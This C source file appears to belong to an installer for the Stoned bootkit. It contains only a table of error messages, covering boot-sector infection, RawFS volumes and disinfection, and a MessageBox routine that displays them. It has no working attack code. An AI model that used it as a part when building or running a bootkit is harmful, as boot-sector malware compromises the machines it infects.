
#include "windows.h"

#ifndef _PROTECTIVE

/* User error messages: English language */
wchar_t * ErrorMessages_English[] =
{
    {   /*  0 */    L"Failed to verify boot drive (unknown Windows error)."                     },
    {   /*  1 */    L"Drive is not bootable, it cannot be infected with Stoned."                },
    {   /*  2 */    L"Failed to format volume with RawFS (unknown Windows error)."              },
    {   /*  3 */    L"Failed to write the boot sector (unknown Windows error)."                 },
    {   /*  4 */    L"Could not open drive to operate (unknown Windows error)."                 },
    {   /*  5 */    L"Invalid command-line argument."                                           },
    {   /*  6 */    L"Failed to restore the bootsector and disinfect the drive."                },
    {   /*  7 */    L"Error removing the RawFS volume."                                         },
    {   /*  8 */    L"Failed to extract a RawFS file."                                          },
    {   /*  9 */    L"Error getting module (this) name."                                        },
    {   /* 10 */    L"Error opening this file."                                                 },
    {   /* 11 */    L"Error reading this file."                                                 },
    {   /* 12 */    L"Error getting files size of this file."                                   },
    {   /* 13 */    L"Error allocating file buffer."                                            },
};


/* output an error message to the user */
void OutputUserError(int Error)
{
    MessageBox(NULL, ErrorMessages_English[Error], L"Error", MB_OK);
    return;
}


// graphic user interface for live cd: todo


#else

void OutputUserError(int Error) {}

#endif
